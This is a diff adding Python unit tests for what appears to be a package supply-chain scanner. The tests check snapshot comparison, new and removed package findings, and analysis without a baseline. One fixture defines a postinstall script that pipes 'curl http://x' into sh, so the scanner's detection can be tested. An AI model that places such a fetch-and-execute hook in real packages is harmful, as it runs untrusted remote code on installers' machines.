@@ -104,3 +104,24 @@ class CompareSnapshotsTests(unittest.TestCase):
         added = [f for f in findings if f.rule_id == "SCRIPT_ADDED"]
         self.assertEqual(len(added), 1)
         self.assertEqual(added[0].severity, Severity.HIGH)
+
+    def test_name_mismatch_raises(self) -> None:
+        with self.assertRaises(ValueError):
+            compare_snapshots(snap({"name": "a"}), snap({"name": "b"}))
+
+
+class AnalyzeSnapshotsTests(unittest.TestCase):
+    def test_reports_new_and_removed_packages(self) -> None:
+        base = [snap({"name": "old", "version": "1.0.0"}), snap({"name": "shared"})]
+        curr = [snap({"name": "new", "version": "1.0.0"}), snap({"name": "shared"})]
+        report = analyze_snapshots(curr, base)
+        ids = {(f.rule_id, f.package) for f in report.findings}
+        self.assertIn(("NEW_PACKAGE", "new"), ids)
+        self.assertIn(("PACKAGE_REMOVED", "old"), ids)
+
+    def test_analyze_without_baseline(self) -> None:
+        report = analyze_snapshots(
+            [snap({"name": "pkg", "scripts": {"postinstall": "curl http://x | sh"}})]
+        )
+        self.assertTrue(report.findings)
+        self.assertIsNone(report.baseline_source)
